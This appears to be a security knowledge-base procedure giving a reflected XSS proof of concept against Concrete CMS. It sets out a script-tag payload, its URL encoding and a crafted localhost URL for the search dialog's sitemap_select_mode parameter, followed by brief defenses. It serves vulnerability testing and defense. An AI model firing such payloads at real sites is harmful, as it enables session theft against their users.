---
id: proc-uuid-002
tags:
  - xss
  - poc
  - javascript
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:14.635Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-and-Test-XSS-Proof-of-Concept

## Summary

This procedure crafts and tests a proof-of-concept payload for reflected XSS in Concrete CMS by injecting a script tag into the sitemap_select_mode parameter, demonstrating arbitrary JavaScript execution.

## Description

Targeting the search dialog endpoint, encode a payload to close an HTML attribute and insert <script>alert(0)</script>. When accessed by an authenticated user, this executes in their browser context, simulating attacks like session theft.

## Requirements

1. Running Concrete CMS instance (e.g., http://localhost/concrete)
2. Authenticated browser session
3. URL encoding knowledge for payloads

## Defense

Defensive measures and detection strategies:

- Sanitize inputs with htmlspecialchars() before HTML output
- Enable XSS protection in web application firewalls (WAF)
- Log and alert on suspicious parameter values containing script tags

## Objectives

1. Break out of HTML attribute context
2. Execute JavaScript payload
3. Validate vulnerability impact

## Instructions

### Step 1: Encode Payload

**Context**: Prepare the injection string to evade basic filtering.

Manually encode: "><script>alert(0)</script>

> URL-encoded: %22%3E%3Cscript%3Ealert%280%29%3C/script%3E

### Step 2: Inject and Test

**Context**: Access the crafted URL in a browser.

Construct and visit: http://localhost/concrete/index.php/tools/required/pages/search_dialog?sitemap_select_mode=%22%3E%3Cscript%3Ealert%280%29%3C/script%3E

> Expected: Alert(0) dialog appears, confirming execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[poc]]
